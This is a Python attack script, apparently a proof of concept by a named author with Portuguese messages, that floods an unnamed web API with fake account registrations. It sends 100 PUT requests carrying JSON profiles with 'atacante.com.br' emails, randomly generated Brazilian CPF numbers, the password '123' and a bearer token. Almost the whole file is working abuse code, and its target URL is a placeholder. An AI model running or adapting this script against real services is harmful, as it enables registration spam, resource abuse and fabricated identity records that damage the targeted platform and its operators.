#!/usr/bin/python3
#
# MASS Account Create
# By: Israel Comazzetto dos Reis

from requests import put
from time import sleep
from random import randint

def mass_account_create(email):
    cpfs = ''.join(map(str, [randint(0, 10) for i in range(0, 10)]))
    cpf = str(cpfs)
    url = 'url'
    payload = str('{"name":"israel","email":"'+email+'@atacante.com.br","cpf":"'+cpf+'","whatsapp":"66666666666","description":"vitima","occupation":"","image":"c0116c10-e549-4f06-a1e8-48681d5f96e6.png","resident":false,"available":true,"userInterests":[{"tagId":"b2e4d52b-39e1-4f07-93c5-e26ad35384cc","level":5},{"tagId":"0f2456e5-6b92-47b2-9f7a-2268d2b6928d","level":5},{"tagId":"a86f49dd-6fd7-4397-99ed-9facfb00d035","level":5},{"tagId":"6ff9d898-a412-4761-a770-1ff24d337820","level":5},{"tagId":"6f1d551b-5385-4f00-a1a4-21d4b1b3213b","level":5},{"tagId":"ea43677b-82ed-4816-96b2-9104721d3dbd","level":5},{"tagId":"1eef667b-fd03-4b8c-a4f8-57eb0354bd17","level":5},{"tagId":"f3650f27-51a7-4f64-8582-41a7e0df104c","level":5},{"tagId":"ca589759-b684-44cc-9fef-88280a226c00","level":5}],"userSkills":[{"tagId":"a86f49dd-6fd7-4397-99ed-9facfb00d035","level":5},{"tagId":"1eef667b-fd03-4b8c-a4f8-57eb0354bd17","level":5},{"tagId":"6ff9d898-a412-4761-a770-1ff24d337820","level":5},{"tagId":"ca589759-b684-44cc-9fef-88280a226c00","level":5},{"tagId":"f3650f27-51a7-4f64-8582-41a7e0df104c","level":5},{"tagId":"ea43677b-82ed-4816-96b2-9104721d3dbd","level":5},{"tagId":"0f2456e5-6b92-47b2-9f7a-2268d2b6928d","level":5},{"tagId":"b2e4d52b-39e1-4f07-93c5-e26ad35384cc","level":5},{"tagId":"6f1d551b-5385-4f00-a1a4-21d4b1b3213b","level":5}],"birth":"2021-04-08","instagram":"","linkedin":"","pne":false,"password":"123","confirmPassword":"123","whatsappVisible":false,"emailVisible":false}')
    headers = {
        'Content-type': 'application/json',
        'Authorization': 'Bearer eyJhbGc'
        }
    flood_request = put(url, headers=headers, data=payload) 
    if "true" in flood_request.text:
        print("[*] Payload enviado com sucesso... Conta criada!")
        sleep(2)
        print('[*] Nome da conta criada: '+email+'@atacante.com.br [*]')
    else:
        print("[-] Payload falhou... [-]")


print("[+] Iniciando Mass Account Create [+]")
print("[+] Gerando payloads [+]")
for emails in range(2000,2100):
    email = str(emails)
    mass_account_create(email)
print("[*] Mass Account Create finalizado...")